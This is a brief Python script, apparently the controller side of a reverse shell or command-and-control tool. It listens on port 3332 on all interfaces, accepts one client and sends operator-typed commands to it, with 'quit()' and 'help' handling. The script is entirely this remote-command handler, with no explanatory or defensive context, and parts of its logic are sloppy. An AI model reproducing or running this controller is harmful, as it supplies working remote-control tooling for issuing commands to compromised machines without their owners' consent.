import socket
import sys
HOST = "0.0.0.0"
PORT = 3332

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((HOST,PORT))
s.listen(1)
client , adrr = s.accept()
print(f"!#Client {adrr} connected#!")
while True:
 command = input("<--|-->")
 if command == "quit()":
    client.send("q".encode())
    client.close()
    sys.exit("Exited")
 if command == "help":
    client.send("help".encode())
    h = client.recv(2024)
    print(h.decode())
 client.send(command.encode())
